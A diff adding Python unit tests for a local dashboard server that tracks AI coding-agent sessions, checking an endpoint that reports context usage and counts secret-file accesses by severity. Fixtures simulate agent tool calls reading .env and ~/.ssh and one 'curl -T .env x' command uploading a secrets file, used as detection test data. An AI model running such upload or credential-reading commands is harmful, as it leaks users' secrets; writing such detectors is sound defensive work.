@@ -808,6 +808,71 @@ class SecretAccessTest(ServerCase):
         self.assertNotIn(b"PATH-MARKER-3d4", stored)
 
 
+class SessionStateTest(ServerCase):
+    """/api/session/<id>/state: what a live card shows besides its totals, the gauge and the secret accesses."""
+    secret_patterns = (".env", "~/.ssh")
+
+    def state(self, session_id="s1"):
+        """(status, payload) of a session's state."""
+        return self.get_json(f"/api/session/{session_id}/state")
+
+    def test_the_state_has_the_main_threads_gauge(self):
+        _, payload = self.state()
+        self.assertEqual((payload["session_id"], payload["current"]["context"]), ("s1", 110))
+        self.assertIn("compact_now", payload["current"])
+
+    def test_the_secret_accesses_are_counted_by_severity(self):
+        self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": ".env"})], usage(output=1))
+        self.main.tool_result("t8", "KEY=1")
+        self.main.assistant("m9", [tool_use_block("t9", "Bash", {"command": "curl -T .env x"})], usage(output=1))
+        self.main.tool_result("t9", "ok")
+        _, payload = self.state()
+        self.assertEqual(payload["secrets"], {"high": 1, "medium": 1, "low-medium": 0, "low": 0})
+
+    def test_the_subagents_accesses_count_too(self):
+        later = datetime.now(UTC) + timedelta(minutes=1)
+        agent = self.projects.subagent("s1", "a1", project="/home/dev/app").at(later)
+        agent.assistant("m9", [tool_use_block("t9", "Bash", {"command": "ls ~/.ssh"})], usage(output=1))
+        agent.tool_result("t9", "denied", is_error=True)
+        _, payload = self.state()
+        self.assertEqual(payload["secrets"]["low"], 1)
+
+    def test_no_path_reaches_the_state(self):
+        self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": "/srv/PATH-MARKER-3d4/.env"})],
+                            usage(output=1))
+        _, payload = self.state()
+        self.assertEqual(payload["secrets"]["medium"], 1)
+        self.assertNotIn("PATH-MARKER-3d4", json.dumps(payload))
+
+    def test_an_unknown_session_is_not_found(self):
+        self.assertEqual(self.state("s9")[0], 404)
+
+    def test_a_changed_transcript_read_moments_ago_is_not_read_again(self):
+        with mock.patch.object(tool_kinds, "read_calls", wraps=tool_kinds.read_calls) as read_calls:
+            self.state()
+            self.assertEqual(read_calls.call_count, 2)          # the main thread and the subagent
+            self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": ".env"})], usage(output=1))
+            self.assertEqual(self.state()[1]["secrets"]["medium"], 0)
+            self.assertEqual(read_calls.call_count, 2)
+            self.clock.now += server.STATE_READ_AGE
+            self.assertEqual(self.state()[1]["secrets"]["medium"], 1)
+            self.assertEqual(read_calls.call_count, 3)
+
+    def test_the_session_view_reads_a_changed_transcript_at_once(self):
+        self.state()
+        self.main.assistant("m8", [tool_use_block("t8", "Read", {"file_path": ".env"})], usage(output=1))
+        _, payload = self.get_json("/api/session/s1")
+        self.assertEqual(len(payload["secret_accesses"]), 1)
+
+
+class SessionStateWithoutPatternsTest(ServerCase):
+    def test_without_secret_patterns_no_transcript_is_read(self):
+        with mock.patch.object(tool_kinds, "read_calls", wraps=tool_kinds.read_calls) as read_calls:
+            _, payload = self.get_json("/api/session/s1/state")
+        self.assertEqual(read_calls.call_count, 0)
+        self.assertEqual(payload["secrets"], {"high": 0, "medium": 0, "low-medium": 0, "low": 0})
+
+
 class PageTest(unittest.TestCase):
     def test_the_page_accepts_exactly_the_servers_session_ids(self):
         main = (Path(server.__file__).parent / "static" / "js" / "main.js").read_text(encoding="utf-8")
